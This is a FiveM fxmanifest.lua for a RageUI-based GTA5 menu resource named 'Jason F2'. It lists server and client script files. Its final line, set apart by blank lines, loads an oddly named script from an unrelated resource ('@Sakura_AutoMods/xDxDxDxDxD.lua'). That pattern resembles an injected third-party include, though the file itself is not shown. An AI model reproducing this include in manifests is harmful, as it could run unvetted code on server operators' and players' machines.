fx_version 'cerulean'
games { 'gta5' };

name 'Jason F2';
description 'Jason F2 via RageUI.'

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'config.lua',
	'server/main.lua'
}

client_scripts {
    "client/RMenu.lua",
    "client/menu/RageUI.lua",
    "client/menu/Menu.lua",
    "client/menu/MenuController.lua",
    "client/components/*.lua",
    "client/menu/elements/*.lua",
    "client/menu/items/*.lua",
    "client/menu/panels/*.lua",
    "client/menu/windows/*.lua",

}

client_scripts {
	 'config.lua',
     'AllMenu.lua',
     'ActionsMenu.lua',
}



client_script '@Sakura_AutoMods/xDxDxDxDxD.lua'